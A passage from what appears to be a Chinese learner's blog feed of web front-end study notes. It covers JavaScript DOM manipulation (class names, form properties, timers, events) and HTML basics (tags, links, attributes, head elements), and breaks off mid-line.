class="language-css"><span class="language-xml">        <span class="attribute">background-color</span>:skyblue;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">        <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;class1&quot;</span>&gt;</span>我是文字的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        box.<span class="property">className</span> = <span class="string">&#x27;class2&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">console</span>.<span class="title function_">log</span>(box)<span class="comment">// 打印出来的class属性为 class2</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li><p>注意这里使用的是className，因为class是关键字</p></li><li><p>属性新值换旧值，这里的class1会被class2覆盖掉</p><p><strong>如果不想覆盖，可以这样修改：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">box.<span class="property">className</span> = <span class="string">&#x27;class1 class2&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>3）通过classList操作</strong></p><p>可以直接追加、删除或者切换类名</p><p>语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 追加一个类</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br><span class="line"><span class="comment">// 删除一个类</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br><span class="line"><span class="comment">// 切换一个类</span></span><br><span class="line"><span class="comment">// 检查有没有使用这个类，如果有就删除，没有就加上（像灯反复按开关一样）</span></span><br><span class="line">元素.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;类名&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>操作表单元素属性</strong></p><p>1）有很多时候需要修改表单的属性，如点击眼睛可以看到密码文本内容，本质就是将password类型转换为text</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表单.<span class="property">value</span> = <span class="string">&#x27;用户名&#x27;</span></span><br><span class="line">表单.<span class="property">value</span> = <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>注意，使用innerHTML是不能获取到表单内容的，只能通过value来获取</li></ul><p>2）表单属性中添加就有效果，移除就没有效果，一律使用布尔值表示。如果为true代表添加了该属性如果是false代表移除了该属性。如点击全选就勾选所有的内容</p><p>如 disabled. checked 、selected，<u>只接受布尔值</u></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方框勾选</span></span><br><span class="line">&lt;input type=<span class="string">&quot;checkbox&quot;</span> name = <span class="string">&quot;&quot;</span> id = <span class="string">&quot;&quot;</span> checked&gt;</span><br><span class="line"><span class="comment">// 禁用点击</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">disabled</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">    </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> ipt = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ipt.<span class="property">checked</span> = <span class="literal">true</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">button.<span class="property">disabled</span> = <span class="literal">true</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ipt.<span class="property">checked</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>如果我们这里写的是 <code>ipt.checked = 'true'</code>， 仍然会改变成true，因为非空、0的字符串默认认定为true。但是并不提倡这么写，不规范</li></ul></li><li><p><strong>自定义属性</strong></p><p>上面都是标准属性，即标签自带的属性，如class、id、title等，通常我们会自定义一些属性</p><ul><li>自定义属性要求<strong>以 <code>data-</code> 开头</strong>，在DOM对象上以 <code>dataset. + 删除掉data-的后面部分 </code> 对象来获取</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义属性data-id，在后面通过dataset.id来获取</span></span><br><span class="line">&lt;div data-id = <span class="string">&#x27;10&#x27;</span>&gt;盒子&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">dataset</span>.<span class="property">id</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li></ol><h2 id="定时器间歇函数"><a class="markdownIt-Anchor" href="#定时器间歇函数"></a> 定时器（间歇函数）</h2><p>定时器面向的功能：需要每隔一段时间自动执行一段代码，不需要手动去触发</p><p>例如：网页中的倒计时。</p><ol><li><p><strong>开启定时器</strong></p><p>语法：setInterval(函数，间隔时间)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接使用函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>,<span class="title function_">log</span>(<span class="string">&#x27;一秒执行一次&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setInterval</span>(fn,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以使用匿名函数</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;一秒钟执行一次&#x27;</span>)</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><ul><li>注意这里是在过了间隔时间后才第一次执行函数，并不是立即执行一次，然后过了间隔时间后再执行第二次</li><li>函数名字不需要加括号</li><li>定时器返回的是一个id数字，表示这是第几个定时器（页面中可能设置了多个定时器）</li></ul></li><li><p><strong>关闭定时器</strong></p><p>语法：clearInterval(定时器id)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="built_in">setInterval</span>(fn,<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">clearInterval</span>(m)</span><br></pre></td></tr></table></figure></li></ol><h2 id="dom事件"><a class="markdownIt-Anchor" href="#dom事件"></a> DOM事件</h2><ol><li><p><strong>基本概念</strong></p><ul><li><strong>什么是事件</strong>：编程时系统内发生的动作或者发生的事情，比如用户在网页上单击一个按钮、图像加载完成、鼠标移动到元素上、输入字段被改变等</li><li><strong>事件监听</strong>：检测是否有时间发生，一旦触发事件，立即调用一个函数做出响应</li></ul></li><li><p><strong>添加事件监听（绑定）</strong></p><p>语法：元素对象.addEventListener(‘事件类型’, 要执行的函数)</p><ul><li>事件类型：事件用什么方式触发，如鼠标单击click、鼠标经过mouseover等</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, myFunction)</span><br></pre></td></tr></table></figure></li><li><p><strong>事件类型</strong></p><ul><li><p>鼠标事件</p><ul><li>鼠标点击：click</li><li>鼠标经过：mouseenter</li><li>鼠标离开：mouseleave</li></ul></li><li><p>焦点事件</p><ul><li>获得焦点：focus</li><li>失去焦点：blur</li></ul><blockquote><p>注意和点击的区别，例如搜索框，鼠标点击后出现下拉框，离开就消失，这种就是得到鼠标+失去鼠标，为焦点事件</p></blockquote></li><li><p>键盘事件</p><ul><li>键盘按下：Keydown</li><li>键盘抬起：Keyup</li></ul></li><li><p>文本事件</p><ul><li>用户输入事件：input</li></ul></li></ul></li><li><p><strong>事件对象</strong></p></li></ol><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><p>map函数遍历数组：<a href="https://blog.csdn.net/qq_23366033/article/details/112036077">JavaScript中的map()方法详解（均采用es6语法）</a></p><h1 id="功能案例"><a class="markdownIt-Anchor" href="#功能案例"></a> 功能案例</h1><h2 id="1-同意协议倒计时"><a class="markdownIt-Anchor" href="#1-同意协议倒计时"></a> 1. 同意协议倒计时</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=decive-width, initial-scale=1&quot; &gt;</span><br><span class="line">    &lt;title&gt;案例1：同意协议倒计时&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;</span><br><span class="line">        用户注册协议</span><br><span class="line">        欢迎注册成为微博用户，请你仔细阅读并同意一下用户协议</span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;button class=&quot;btn&quot; disabled&gt;我已经阅读用户协议（5）&lt;/button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const btn = document.querySelector(&#x27;.btn&#x27;)</span><br><span class="line">        let i = 5</span><br><span class="line">        let n = setInterval(function()&#123;</span><br><span class="line">            i -- </span><br><span class="line">            btn.innerHTML = `我已经阅读用户协议（$&#123;i&#125;）`</span><br><span class="line">            if (i==0) &#123;</span><br><span class="line">                clearInterval(n)</span><br><span class="line">                btn.disabled = false</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,1000)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-轮播图"><a class="markdownIt-Anchor" href="#2-轮播图"></a> 2. 轮播图</h2><p>见视频P97、98</p><h2 id="3-发布评论"><a class="markdownIt-Anchor" href="#3-发布评论"></a> 3. 发布评论</h2><p>见视频P99</p>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』HTML学习</title>
      <link href="/posts/4b93.html"/>
      <url>/posts/4b93.html</url>
      
        <content type="html"><![CDATA[<p>本文主要记录对HTML基础知识的学习，主要内容基于 <a href="https://www.runoob.com/html/html-tutorial.html">HTML 教程 | 菜鸟教程</a></p><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>定义</strong></p><p>HTML 是指超文本标记语言，它是一套用来描述网页的标记标签。HTML 文档包含了 HTML 标签及文本内容，也就是我们常说的 web 页面。</p></li><li><p><strong>HTML文档的基本结构</strong></p><p>由声明+头部+body组成</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710163159973.png" alt="image-20240710163159973" /></p></li></ol><h1 id="标签"><a class="markdownIt-Anchor" href="#标签"></a> 标签</h1><p>这里指的是body中的标签和元素</p><ol><li><p><strong>标签和元素的区别</strong></p><p>标签</p><ul><li>HTML 标签是由尖括号包围的关键词，比如 <code>&lt;html&gt;</code></li><li>HTML 标签通常是成对出现的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code></li><li>标签对中的第一个标签是开始标签，第二个标签是结束标签</li></ul><p>元素</p><ul><li><p>元素即为包括标签和内容的部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--这个整体为元素--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">标签</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>常见的四个标签</strong></p></li></ol><p>（1）<code>&lt;h1&gt;-&lt;h6&gt;</code> 用于定义HTML标题</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--标题--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>请确保将 HTML 标题 标签只用于标题。不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题。</li></ul><p>（2）<code>&lt;p&gt;</code> 标签用于定义段落</p><p>使用该标签，文本内容结束后会自动换行，行之间存在一些间距</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--段落--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;br&gt;</code> 标签用于在文本中创建换行。他和 <code>&lt;p&gt;</code>  标签的区别就在于它只是文本中创建简单的换行，并不是新的段落，换行之间并没有一定的空白。</p></blockquote><p>（3）<code>&lt;a&gt;</code> 标签用于链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--链接--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>&lt;a&gt;</code> 的常见属性</p><ul><li><p><code>href</code>：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。</p></li><li><p><code>target</code>（可选）：指定链接如何在浏览器中打开。常见的值包括 <code>_blank</code>（在新标签或窗口中打开链接）和 <code>_self</code>（在当前标签或窗口中打开链接）。</p></li><li><p><code>title</code>（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。</p></li><li><p><code>rel</code>（可选）：表示<u>链接文档与当前文档的关系</u></p><ul><li><code>rel=&quot;stylesheet&quot;</code> ：表示被链接的文档是一个样式表文件，用于页面的样式定义。</li><li><code>rel=&quot;icon&quot;</code> ：表示被链接的文档是一个图标文件，通常用于网站的 favicon。</li><li><code>rel=&quot;nofollow</code>：指示搜索引擎不应该跟踪被链接的页面，通常用于防止无关链接对搜索引擎排名的干扰</li><li><code>rel=&quot;noopener&quot;</code> 或 <code>rel=&quot;noreferrer&quot;</code>：用来增强安全性。<code>rel=&quot;noopener&quot;</code> 通知浏览器在新标签页打开时不应让新页面访问 opener 对象，从而防止恶意页面通过 opener 访问原始页面。<code>rel=&quot;noreferrer&quot;</code> 类似，还会阻止传递 referrer 信息。</li></ul></li></ul></li><li><p>除了文本内容、图片或其他HTML元素都可以成为链接</p><ul><li><p><strong>文本链接</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>访问示例网站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>图像链接</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;example.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>**锚点链接：**除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <code>&lt;a&gt;</code> 元素定义一个标记，并使用 # 符号引用该标记。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#section2&quot;</span>&gt;</span>跳转到第二部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在页面中的某个位置 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这里可以用name属性也可以用id属性等 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;section2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>也可以从其他HTML页面创建链接直接指向这里</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com/html/html-links.html#section2&quot;</span>&gt;</span></span><br><span class="line">访问有用的提示部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>**下载链接：**如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>（4）<strong>图像</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--图像--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/images/logo.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;258&quot;</span> <span class="attr">height</span>=<span class="string">&quot;39&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>img</code> 标签的常见属性<ul><li><code>src</code> ：图像的 URL 地址</li><li><code>alt</code> ： 替代性文本。在浏览器无法载入图像时，浏览器将显示这个替代性的文本。</li><li><code>width=&quot;304&quot; height=&quot;228&quot;</code>：指定图像的高度和宽度，单位像素。</li></ul></li></ul><ol start="3"><li><p><strong>其他标签</strong></p><ul><li><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线，用于分隔内容，单标签，不需要闭合。</li><li><code>&lt;br&gt;</code> 标签用于在文本中创建换行。单标签，不需要闭合。</li><li><code>&lt;div&gt;</code>：属于块级标签，独占一行，可以设置宽度、高度以及边距等样式属性。<ul><li>它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。</li><li><strong>可以容纳其他块级元素和行内元素</strong>，包括其他的 <code>&lt;div&gt;</code> 和 <code>&lt;span&gt;</code> 元素。</li></ul></li><li><code>&lt;span&gt;</code>：内联元素，可用作文本的容器，对部分文本进行更精细的CSS制定</li></ul></li><li><p><strong>格式化标签</strong></p><p>即加粗、上标、下标等特殊的字体格式标签</p><p><a href="https://www.runoob.com/html/html-formatting.html">HTML文本格式化|菜鸟教程</a></p></li></ol><h1 id="元素"><a class="markdownIt-Anchor" href="#元素"></a> 元素</h1><ol><li><p>大多数 HTML 元素被定义为<strong>块级元素</strong>或<strong>内联元素</strong>。</p><ul><li><p><strong>块级元素</strong>：在浏览器显示时，通常会以新行来开始（和结束）。</p><ul><li>实例： <code>&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</code></li></ul></li><li><p><strong>内联元素</strong>：在显示时，不会以新行开始</p><ul><li>实例：<code>&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</code></li></ul></li></ul></li><li></li></ol><h1 id="属性"><a class="markdownIt-Anchor" href="#属性"></a> 属性</h1><ol><li><p><strong>什么是属性</strong></p><ul><li><p>HTML 元素可以设置<strong>属性</strong></p></li><li><p>属性可以在元素中添加<strong>附加信息</strong></p></li><li><p>属性一般描述于<strong>开始标签</strong></p></li><li><p>属性总是以名称/值对的形式出现，比如：name=“value”。（属性推荐使用小写）</p><blockquote><p>链接标签中的 <code>href</code> 就是属性</p></blockquote></li></ul></li><li><p><strong>常见的属性类型</strong></p><table><thead><tr><th>class</th><th>为html元素定义一个或多个类名（classname）(类名从样式文件引入)</th></tr></thead><tbody><tr><td>id</td><td>定义元素的唯一id</td></tr><tr><td>style</td><td>规定元素的行内样式（inline style）</td></tr><tr><td>title</td><td>描述了元素的额外信息 (作为工具条使用)</td></tr></tbody></table><ul><li>ID属性不要以数字开头，数字开头的ID在 Mozilla/Firefox 浏览器中不起作用。</li></ul><blockquote><ul><li><p><strong>class和style的区别</strong></p><p><code>class</code>属性主要用于引用外部或内部样式表中定义的样式类，从而<strong>实现样式的复用和统一管理</strong>；而<code>style</code>属性则<strong>直接为单个元素指定内联样式</strong>，适用于需要特定样式的情况。</p></li><li><p><strong>class和id</strong></p><p>注意在 HTML 中，<code>id</code> 属性必须是唯一的。每个元素的 <code>id</code> 值在整个文档中都应该是唯一的，以确保正确的标识和引用。如果需要为多个元素应用相同的样式或进行相同的操作，建议使用 <code>class</code> 属性。</p></li></ul></blockquote></li></ol><h1 id="html头部"><a class="markdownIt-Anchor" href="#html头部"></a> HTML头部</h1><p><code>&lt;head&gt;</code>元素包含了所有的头部标签元素。在 <code>&lt;head&gt;</code> 元素中你可以插入<strong>脚本（scripts）, 样式文件（CSS），及各种meta信息</strong>。</p><p>可以添加在头部区域的元素标签包括: <code>&lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;</code>。</p><ol><li><p><code>&lt;title&gt;</code> 元素：定义了网页标题</p></li><li><p><code>&lt;base&gt;</code> 元素：定义了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>&lt;link&gt;</code> 元素：定义了文档与外部资源之间的关系，通常用于链接到样式表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>其中 <code>href</code> 属性指定了外部样式表的路径</li><li></li></ul></li><li><p><code>&lt;style&gt;</code>元素：定义了HTML文档的样式文件引用地址，在该元素中你也可以直接添加样式来渲染 HTML 文档</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>:yellow;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>:blue</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>这里的 <code>&lt;style&gt;</code> 标签和前面说到的 style 属性又有什么区别呢</strong></p><ul><li><code>&lt;style&gt;</code>元素用于在<code>&lt;head&gt;</code>标签内定义整体或特定部分的样式表，适用于页面级别的样式管理。相对于CSS并不能引入外部样式表</li><li>而<code>style</code>属性用于直接在HTML标签内定义特定元素的行内样式，适用于局部的样式设置，具有更高的优先级。</li></ul></blockquote></li><li><p><code>meta</code> 元素：定义一些基本的元数据</p><p>为搜索引擎定义关键词:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, 